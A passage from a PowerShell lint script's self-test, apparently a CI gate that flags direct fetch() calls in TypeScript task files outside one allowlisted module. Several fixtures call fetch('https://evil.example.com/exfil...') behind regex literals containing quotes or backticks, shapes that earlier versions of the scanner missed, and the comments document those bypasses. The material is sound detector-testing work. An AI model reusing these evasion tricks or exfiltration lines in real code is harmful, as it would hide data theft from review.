    [IO.File]::WriteAllText((Join-Path $tmp 'import-path-literal.task.ts'), 'import { orchestrateDiscoveredFetch } from ''../public-intelligence/orchestration/orchestrate-discovered-fetch.mjs'';
export async function run() { return orchestrateDiscoveredFetch({}); }
', (New-Object System.Text.UTF8Encoding($false)))
    # Good (2026-09-18, Task 10 follow-up -- real false positive this exact
    # fixture reproduces): app/scripts/verify-sink-hci-discovered.mjs's own
    # bucket-name literal shape ('s3://hci-fetch-runner-raw/...').
    [IO.File]::WriteAllText((Join-Path $tmp 'bucket-name-literal.task.ts'), 'export async function run() {
  const ref = ''s3://hci-fetch-runner-raw/sha256/'' + ''a'';
  return ref;
}
', (New-Object System.Text.UTF8Encoding($false)))
    # Bad (2026-09-18, Task 10 follow-up -- real repro of an adjacent bug
    # this same rewrite closes): a URL string literal earlier on the SAME
    # LINE as a real fetch() call. The old two-stage approach (regex-strip
    # `//` comments BEFORE any string-awareness existed) mistook the
    # string's own embedded "//" for a line-comment start and deleted
    # everything after it on that line -- including this real fetch call --
    # so this would have silently PASSED before the rewrite. Must still be
    # flagged.
    [IO.File]::WriteAllText((Join-Path $tmp 'same-line-url-and-real-fetch.task.ts'), 'export async function run() {
  const base = ''http://example.com''; return fetch(base);
}
', (New-Object System.Text.UTF8Encoding($false)))
    # Good: template-literal TEXT containing a fetch-lookalike word with no
    # real interpolated call -- must not false-positive, same as a plain
    # string literal must not.
    [IO.File]::WriteAllText((Join-Path $tmp 'template-text-only.task.ts'), 'export async function run() {
  return `warning: do not fetch-runner this directly`;
}
', (New-Object System.Text.UTF8Encoding($false)))
    # Bad: a real fetch() call INSIDE a template literal's `${...}`
    # interpolation -- must still be flagged. Proves the string/template
    # stripping fix does not overreach into blanking real executable code
    # just because it is nested inside backticks.
    [IO.File]::WriteAllText((Join-Path $tmp 'template-interpolated-call.task.ts'), 'export async function run() {
  return `result: ${fetch(url)}`;
}
', (New-Object System.Text.UTF8Encoding($false)))
    # Good: a real vendored dependency file under node_modules containing an
    # unambiguous violation shape -- must be excluded purely by path, same
    # as the real app/node_modules tree this fix targets.
    New-Item -ItemType Directory -Path (Join-Path $tmp 'node_modules/vendored-pkg') -Force | Out-Null
    [IO.File]::WriteAllText((Join-Path $tmp 'node_modules/vendored-pkg/index.mjs'),
      "export function legacyFetch(url) { return fetch(url); }`n",
      (New-Object System.Text.UTF8Encoding($false)))
    # Bad (critic review 2026-09-18, Critical, real PoC this exact fixture
    # reproduces -- found in THIS same-day rewrite, not pre-existing): a
    # regex literal containing a quote character. Before Test-RegexLiteral-
    # Possible/Read-RegexLiteralEnd existed, the lone `"` inside `/"/` was
    # mistaken for opening a real string, and the quote-consuming loop ran
    # to the next matching `"` ANYWHERE LATER IN THE FILE, silently
    # swallowing the real `fetch(...)` call on the same line. Verified by
    # actually running this fixture through the OLD code before fixing it:
    # 0 violations found ("ok") -- confirmed a live bypass, not a
    # hypothetical one.
    [IO.File]::WriteAllText((Join-Path $tmp 'regex-literal-with-quote-and-real-fetch.task.ts'), 'export async function run() {
  const re = /"/;
  return fetch(''https://evil.example.com/exfil'');
}
', (New-Object System.Text.UTF8Encoding($false)))
    # Bad, same class as above but with a backtick inside the regex literal
    # instead of a quote -- worth its own fixture since a stray backtick
    # desyncs TEMPLATE tracking instead of string tracking, a structurally
    # different (and, unguarded, even further-reaching) failure mode than
    # the quote variant.
    [IO.File]::WriteAllText((Join-Path $tmp 'regex-literal-with-backtick-and-real-fetch.task.ts'), 'export async function run() {
  const re = /`/;
  return fetch(''https://evil.example.com/exfil2'');
}
', (New-Object System.Text.UTF8Encoding($false)))
    # Good: a real division expression, plus a SEPARATE real regex literal
    # that happens to spell "fetch" as pattern text -- neither may be
    # flagged. Proves (a) Test-RegexLiteralPossible's heuristic does not
    # mistake ordinary division for a regex-literal open (which could
    # swallow real code the same way the bug above did), and (b) a regex
    # literal's own pattern text is blanked like a string's, not scanned as
    # code (closing the file's previously-documented, now-avoidable minor
    # false positive on this exact shape).
    [IO.File]::WriteAllText((Join-Path $tmp 'division-and-regex-spelling-fetch.task.ts'), 'export function ratio(width, height) {
  const r = width / height;
  const pattern = /fetch\(/;
  return pattern.test(String(r));
}
', (New-Object System.Text.UTF8Encoding($false)))
    # Bad (critic review 2026-09-18, 2nd pass, Critical, real PoC this exact
    # fixture reproduces -- found in the FIRST version of the regex-literal
    # fix above, same day): a regex literal immediately after the keyword
    # `return`. The first version of Test-RegexLiteralPossible only looked
    # at the single previous CHARACTER ('n', ends a letter) and so treated
    # this exactly like an ordinary identifier -- "not a regex start" --
    # leaving the `/"/`'s own embedded `"` to fall through to the ordinary
    # quote-consuming path and swallow the real fetch() call after it, the
    # SAME bug class the regex-literal fix exists to close. Verified by
    # running this fixture through that first version: 0 violations found.
    [IO.File]::WriteAllText((Join-Path $tmp 'keyword-before-regex-with-quote-and-real-fetch.task.ts'), 'export async function run() {
  return /"/.test(x) ? fetch(''https://evil.example.com/exfil-poc1'') : null;
}
', (New-Object System.Text.UTF8Encoding($false)))
    # Bad (critic review 2026-09-18, 2nd pass, Critical, real PoC this exact
    # fixture reproduces -- unbounded blast radius, found in the FIRST
    # version of the regex-literal fix above, same day): a tagged template
    # (`sql\`...\``, a real, common JS/TS pattern) whose `${...}`
    # interpolation opens with a regex literal. Before the `$lastSig = $null`
    # reset on `${` entry existed, stale state from BEFORE the template even
    # started could misclassify the interpolation's leading `/` as division,
    # letting its embedded quote swallow the interpolation's own closing `}`
    # AND the template's own closing backtick as fake string content --
    # leaving the interp/template stack frames permanently unpopped for the
    # REST OF THE FILE. `run2` below is a second, wholly unrelated function
    # whose real fetch() call is the actual thing this fixture proves is
    # still detected -- verified by running this fixture through the first
    # version of the fix: 0 violations found for the ENTIRE FILE (run2 was
    # invisible, not just under-detected).
    [IO.File]::WriteAllText((Join-Path $tmp 'tagged-template-interpolation-leak.task.ts'), 'export async function run() {
  const q = sql`${/"/.test(x) ? "y" : "n"}`;
}

export async function run2() {
  return fetch(''https://evil.example.com/exfil-poc3'');
}
', (New-Object System.Text.UTF8Encoding($false)))

    $found = Get-TriggerDirectFetchViolations -Dir $tmp -AllowlistRelativePath 'runner-client.mjs'
    # Real repro, running this for real: a bare `-split ':'` breaks on
    # Windows, where the violation string's own path starts "C:\..." -- the
    # drive-letter colon splits before the real "<path>: <message>"
    # separator ever does, leaving just "C" as the extracted "filename".
    # Splitting on ": " (colon-SPACE, the actual separator this script's own
    # violation strings use, `"$($f.FullName): ..."` above) instead of a
    # bare colon fixes it -- paths themselves never contain ": ".
    $foundFiles = @($found | Where-Object { $_ -match ': ' } | ForEach-Object { ($_ -split ': ', 2)[0] } | Sort-Object -Unique | ForEach-Object { Split-Path -Leaf $_ })
    $expectedFiles = @('enqueue.task.ts', 'status.task.ts', 'aliased.task.ts', 'runner-client-shim.mjs', 'same-line-url-and-real-fetch.task.ts', 'template-interpolated-call.task.ts', 'regex-literal-with-quote-and-real-fetch.task.ts', 'regex-literal-with-backtick-and-real-fetch.task.ts', 'keyword-before-regex-with-quote-and-real-fetch.task.ts', 'tagged-template-interpolation-leak.task.ts') | Sort-Object
    if (@(Compare-Object $foundFiles $expectedFiles).Count -ne 0) {
      Write-Host 'check-trigger-no-direct-fetch: SELF-TEST FAILED -- expected exactly enqueue.task.ts (bare fetch call), status.task.ts (undici import), aliased.task.ts (fetch aliased to a local name then called), runner-client-shim.mjs (decoy filename, not the exact allowlisted path), same-line-url-and-real-fetch.task.ts (real fetch call sharing a line with a URL string literal), template-interpolated-call.task.ts (real fetch call inside a template literal interpolation), regex-literal-with-quote-and-real-fetch.task.ts and regex-literal-with-backtick-and-real-fetch.task.ts (real fetch call sharing a file with a regex literal containing a quote/backtick), keyword-before-regex-with-quote-and-real-fetch.task.ts (regex literal after a keyword, containing a quote), and tagged-template-interpolation-leak.task.ts (real fetch call in a second function after a tagged-template interpolation frame leak) to be flagged; clean.task.ts, runner-client.mjs, import-path-literal.task.ts, bucket-name-literal.task.ts, template-text-only.task.ts, node_modules/vendored-pkg/index.mjs, and division-and-regex-spelling-fetch.task.ts must NOT be flagged. Got:'
      $found | ForEach-Object { Write-Host "  $_" }
      exit 2
    }

    # Zero-tolerance mode (-NoAllowlist, Task 10 follow-up): same fixture
    # directory, but now with no exempted file at all -- proves (a)
    # runner-client.mjs's own real fetch call, previously exempted, is now
    # flagged like any other file, and (b) no "expected exactly 1 file"
    # message appears (there is no allowlist concept in this mode).
    $foundZeroTolerance = Get-TriggerDirectFetchViolations -Dir $tmp -NoAllowlist
    $foundZeroToleranceFiles = @($foundZeroTolerance | Where-Object { $_ -match ': ' } | ForEach-Object { ($_ -split ': ', 2)[0] } | Sort-Object -Unique | ForEach-Object { Split-Path -Leaf $_ })
    $expectedZeroToleranceFiles = @($expectedFiles + 'runner-client.mjs') | Sort-Object
    if (@(Compare-Object $foundZeroToleranceFiles $expectedZeroToleranceFiles).Count -ne 0) {
      Write-Host 'check-trigger-no-direct-fetch: SELF-TEST FAILED (-NoAllowlist) -- expected the same files as the allowlisted-mode run PLUS runner-client.mjs itself (zero-tolerance exempts nothing). Got:'
      $foundZeroTolerance | ForEach-Object { Write-Host "  $_" }
      exit 2
    }
    if (@($foundZeroTolerance | Where-Object { $_ -like 'expected exactly 1 file*' }).Count -ne 0) {
      Write-Host 'check-trigger-no-direct-fetch: SELF-TEST FAILED (-NoAllowlist) -- must never emit an "expected exactly 1 file" message; there is no allowlist concept in zero-tolerance mode. Got:'
      $foundZeroTolerance | ForEach-Object { Write-Host "  $_" }
      exit 2
    }

    # Critic review 2026-09-18 (Major): the "expected exactly 1 file at
    # <allowlist path>" assertion (Get-TriggerDirectFetchViolations, below)
    # had ZERO self-test coverage -- every fixture directory above always
    # has exactly 1 real file at the allowlist path, so this specific
    # found-0 path was never actually exercised (non-vacuity, not a mutation
    # test: a 2nd critic pass correctly noted $allowlistMatchCount can only
    # ever be 0 or 1 in real usage -- a single exact relative-path string
    # comparison, per the file's own header -- so `-ne 1` and `-lt 1` are
    # behaviorally identical for every reachable value here; this fixture
    # proves the found-0 branch itself actually fires and reports correctly,
    # not that it survives a specific mutation). Also confirmed the `': '`-
    # split extraction pipeline used
    # for $foundFiles/$foundZeroToleranceFiles above CANNOT be reused for
    # this assertion: that message's own separator is ' -- ' (a literal
    # example -- "found 0" -- appears in the message text below), not ': ',
    # so it would silently be filtered OUT of $foundFiles by the `-match ':
    # '` step even if it existed unasserted here. Checked directly against
    # the raw string instead.
    $missingAllowlistDir = Join-Path $tmp 'missing-allowlist-subdir'
    New-Item -ItemType Directory -Path $missingAllowlistDir -Force | Out-Null
    [IO.File]::WriteAllText((Join-Path $missingAllowlistDir 'clean.task.ts'),
      "export async function run() { return null; }`n",
      (New-Object System.Text.UTF8Encoding($false)))
    $foundMissingAllowlist = Get-TriggerDirectFetchViolations -Dir $missingAllowlistDir -AllowlistRelativePath 'runner-client.mjs'
    if (@($foundMissingAllowlist | Where-Object { $_ -like "*expected exactly 1 file at 'runner-client.mjs'*found 0*" }).Count -ne 1) {
      Write-Host 'check-trigger-no-direct-fetch: SELF-TEST FAILED -- a directory with NO file at the allowlist path must produce exactly one "expected exactly 1 file ... found 0" violation. Got:'
      $foundMissingAllowlist | ForEach-Object { Write-Host "  $_" }
      exit 2
    }
  } finally {
    Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
  }
  Write-Host 'check-trigger-no-direct-fetch: self-test ok (bare fetch() calls, aliased/re-exported fetch references, raw HTTP-client imports, a real fetch() call sharing a file with a quote/backtick-containing regex literal, and a filename-substring-only decoy are all flagged outside the allowlisted runner-client.mjs; fetch-lookalike text inside string/template literals, ordinary division, a regex literal spelling fetch as pattern text, a node_modules-vendored file, a comment mentioning fetch/http, and the real allowlisted module itself are not; -NoAllowlist zero-tolerance mode additionally flags the allowlisted module too and never emits the exactly-1-file message; a directory missing the allowlisted file entirely produces exactly the expected found-0 violation)'
}

if (-not (Test-Path -LiteralPath $Dir)) { throw "directory not found: $Dir" }
$real = Get-TriggerDirectFetchViolations -Dir $Dir -AllowlistRelativePath $AllowlistRelativePath -NoAllowlist:$NoAllowlist
if ($real.Count -gt 0) {
  Write-Host ('check-trigger-no-direct-fetch: FAIL -- {0} violation(s) (ADR-0029 gate 6, wave6-trigger-no-direct-fetch):' -f $real.Count)
  $real | ForEach-Object { Write-Host "  $_" }
  exit 1
}
if ($NoAllowlist) {
  Write-Host 'check-trigger-no-direct-fetch: ok -- no direct/aliased HTTP client usage anywhere in this directory (zero-tolerance mode, no allowlisted module -- regex-based scan, see this file''s own header for the dynamic-property-access and regex-literal blind spots this cannot catch)'
} else {
  Write-Host 'check-trigger-no-direct-fetch: ok -- no direct/aliased HTTP client usage outside the allowlisted runner-client module (regex-based scan -- see this file''s own header for the dynamic-property-access blind spot this cannot catch)'
}
exit 0
